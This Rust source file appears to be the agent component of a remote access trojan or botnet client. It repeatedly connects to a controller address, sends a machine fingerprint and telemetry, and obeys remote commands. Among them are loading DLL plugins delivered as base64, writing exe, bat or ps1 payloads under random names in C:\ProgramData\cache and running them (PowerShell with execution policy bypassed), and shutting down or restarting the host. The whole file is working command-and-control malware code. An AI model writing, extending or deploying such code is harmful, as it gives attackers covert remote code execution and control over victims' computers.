use std::{
    io::{BufRead, BufReader, ErrorKind, Write},
    net::TcpStream,
    thread,
    time::Duration,
};

use crate::{plugin::Manager, sys, telemetry, text};

pub fn run(ip: &str, port: u16) {
    let fp = telemetry::fingerprint();
    let host = telemetry::host(&fp);
    let mut plugins = Manager::new();

    loop {
        match TcpStream::connect((ip, port)) {
            Ok(mut stream) => {
                let ping = telemetry::ping_ms(ip);
                let _ = stream.set_read_timeout(Some(Duration::from_secs(text::READ)));
                let data = telemetry::record(ip, ping, &fp);

                if send(&mut stream, &format!("{}{}", text::HELLO, fp)).is_ok()
                    && send(&mut stream, &format!("{}{}", text::DATA, data)).is_ok()
                {
                    println!("{}", text::CONNECTED);
                    plugins.event("agent.connected", host.as_bytes());
                    if session(&mut stream, ip, &fp, &host, &mut plugins) {
                        plugins.clear();
                        return;
                    }
                    plugins.clear();
                }
            }
            Err(_) => {}
        }

        println!("{}", text::RETRYING);
        thread::sleep(Duration::from_secs(text::RETRY));
    }
}

fn session(stream: &mut TcpStream, ip: &str, fp: &str, host: &str, plugins: &mut Manager) -> bool {
    let Ok(clone) = stream.try_clone() else { return false; };
    let mut reader = BufReader::new(clone);

    loop {
        match line(&mut reader) {
            Ok(Some(value)) if value == text::HB => {
                let _ = send(stream, text::PONG);
            }
            Ok(Some(value)) if value == text::REQ => {
                let _ = send(stream, text::PONG);
                let _ = send(stream, &format!("{}{}", text::DATA, telemetry::record(ip, None, fp)));
            }
            Ok(Some(value)) if value.starts_with(text::CMD) => {
                let raw = value[text::CMD.len()..].trim();

                // CMD:PLUGIN:<id>:<base64-dll-bytes>
                if raw.to_ascii_uppercase().starts_with(text::PLUGIN) {
                    let rest = raw[text::PLUGIN.len()..].trim();
                    // id is up to first ':'
                    let (id, b64) = match rest.split_once(':') {
                        Some((i, b)) => (i.trim(), b.trim()),
                        None => {
                            let _ = send(stream, &format!("{}{}", text::ERR, text::PLUGIN));
                            continue;
                        }
                    };
                    if id.is_empty() || b64.is_empty() {
                        let _ = send(stream, &format!("{}{}", text::ERR, text::PLUGIN));
                        continue;
                    }
                    match decode_b64(b64) {
                        Some(dll_bytes) => match plugins.load(id, &dll_bytes, host.as_bytes()) {
                            Ok(()) => {
                                let _ = send(stream, &format!("{}{}{}", text::ACK, text::PLUGIN, id));
                            }
                            Err(_) => {
                                let _ = send(stream, &format!("{}{}", text::ERR, text::PLUGIN));
                            }
                        },
                        None => {
                            let _ = send(stream, &format!("{}{}", text::ERR, text::PLUGIN));
                        }
                    }
                    continue;
                }

                if raw.to_ascii_uppercase().starts_with("UNLOAD:") {
                    let id = raw[7..].trim();
                    let ok = plugins.unload(id);
                    let _ = send(stream, &format!("{}{}{}", if ok { text::ACK } else { text::ERR }, text::PLUGOUT, id));
                    continue;
                }

                if raw.to_ascii_uppercase().starts_with(text::PEVENT) {
                    let event = raw[text::PEVENT.len()..].trim();
                    if event.is_empty() {
                        let _ = send(stream, &format!("{}{}", text::ERR, text::PEVENT));
                    } else {
                        plugins.event(event, &[]);
                        let _ = send(stream, &format!("{}{}{}", text::ACK, text::PEVENT, event));
                    }
                    continue;
                }

                if raw.to_ascii_uppercase().starts_with(text::EXECUTE) {
                    let rest = raw[text::EXECUTE.len()..].trim();
                    let (ext, b64) = match rest.split_once(':') {
                        Some((e, b)) => (e.trim(), b.trim()),
                        None => {
                            let _ = send(stream, &format!("{}{}", text::ERR, text::EXECUTE));
                            continue;
                        }
                    };
                    let ext_lc = ext.to_ascii_lowercase();
                    if !matches!(ext_lc.as_str(), "exe" | "bat" | "ps1") || b64.is_empty() {
                        let _ = send(stream, &format!("{}{}", text::ERR, text::EXECUTE));
                        continue;
                    }
                    match decode_b64(b64) {
                        Some(bytes) => match drop_and_run(&bytes, &ext_lc) {
                            Ok(()) => { let _ = send(stream, &format!("{}{}", text::ACK, text::EXECUTE)); }
                            Err(_) => { let _ = send(stream, &format!("{}{}", text::ERR, text::EXECUTE)); }
                        },
                        None => { let _ = send(stream, &format!("{}{}", text::ERR, text::EXECUTE)); }
                    }
                    continue;
                }

                let cmd = raw.to_ascii_uppercase();
                match cmd.as_str() {
                    text::RECONNECT => {
                        let _ = send(stream, &format!("{}{}", text::ACK, cmd));
                        return false;
                    }
                    text::CLOSE => {
                        let _ = send(stream, &format!("{}{}", text::ACK, cmd));
                        println!("{}", text::CLOSED);
                        return true;
                    }
                    text::SLEEP | text::HIBERNATE | text::RESTART | text::SHUTDOWN => {
                        let ok = sys::command(&cmd);
                        let _ = send(stream, &format!("{}{}", if ok { text::ACK } else { text::ERR }, cmd));
                        plugins.event("agent.command", cmd.as_bytes());
                        if ok { return true; }
                    }
                    _ => {}
                }
            }
            Ok(Some(_)) => {}
            Ok(None) => return false,
            Err(e) if matches!(e.kind(), ErrorKind::TimedOut | ErrorKind::WouldBlock) => {
                let _ = send(stream, text::HB);
            }
            Err(_) => return false,
        }
    }
}

fn drop_and_run(bytes: &[u8], ext: &str) -> std::io::Result<()> {
    use std::{fs, process::Command, time::SystemTime};

    let seed = SystemTime::now()
        .duration_since(SystemTime::UNIX_EPOCH)
        .map(|d| d.as_nanos() as u64)
        .unwrap_or(0)
        ^ (bytes.len() as u64).wrapping_mul(0x9e37_79b9_7f4a_7c15);
    let name = format!("{:012x}", seed & 0xffff_ffff_ffff);

    let dir = std::path::Path::new(r"C:\ProgramData\cache");
    fs::create_dir_all(dir)?;
    let path = dir.join(format!("{name}.{ext}"));
    fs::write(&path, bytes)?;

    match ext {
        "exe" => { Command::new(&path).spawn()?; }
        "bat" => { Command::new("cmd").args(["/c", path.to_str().unwrap_or("")]).spawn()?; }
        "ps1" => { Command::new("powershell").args(["-NoProfile", "-ExecutionPolicy", "Bypass", "-File", path.to_str().unwrap_or("")]).spawn()?; }
        _ => {}
    }
    Ok(())
}

// Minimal base64 decoder (RFC 4648, no padding requirement)
fn decode_b64(s: &str) -> Option<Vec<u8>> {
    let s = s.trim();
    let mut out = Vec::with_capacity(s.len() * 3 / 4);
    let mut buf = 0u32;
    let mut bits = 0u32;
    for b in s.bytes() {
        let v = match b {
            b'A'..=b'Z' => (b - b'A') as u32,
            b'a'..=b'z' => (b - b'a' + 26) as u32,
            b'0'..=b'9' => (b - b'0' + 52) as u32,
            b'+' | b'-' => 62,
            b'/' | b'_' => 63,
            b'=' | b'\r' | b'\n' | b' ' => continue,
            _ => return None,
        };
        buf = (buf << 6) | v;
        bits += 6;
        if bits >= 8 {
            bits -= 8;
            out.push((buf >> bits) as u8);
            buf &= (1 << bits) - 1;
        }
    }
    Some(out)
}

fn line(r: &mut BufReader<TcpStream>) -> std::io::Result<Option<String>> {
    let mut s = String::new();
    Ok(match r.read_line(&mut s)? {
        0 => None,
        _ => Some(s.trim_end_matches(['\r', '\n']).to_owned()),
    })
}

fn send(stream: &mut TcpStream, s: &str) -> std::io::Result<()> {
    stream.write_all(s.as_bytes())?;
    stream.write_all(b"\n")
}
